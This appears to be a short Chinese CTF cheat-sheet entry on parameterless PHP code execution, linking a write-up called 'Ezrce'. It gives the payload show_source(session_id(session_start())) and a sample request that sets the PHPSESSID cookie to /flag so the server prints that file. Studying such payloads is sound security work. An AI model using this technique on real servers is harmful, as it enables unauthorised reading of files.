
# 无参数rce
* [Ezrce](https://mp.weixin.qq.com/s/lTcijxa9eoWMm0TRKwJh_A)

```php
show_source(session_id(session_start()));

/*
// 请求
Cookie: PHPSESSID=/flag
...
Upgrade-Insecure-Requests:1

name=hahaha&qaq=show_source%28session_id%28session_start%28%29%29%29%3b
*/
```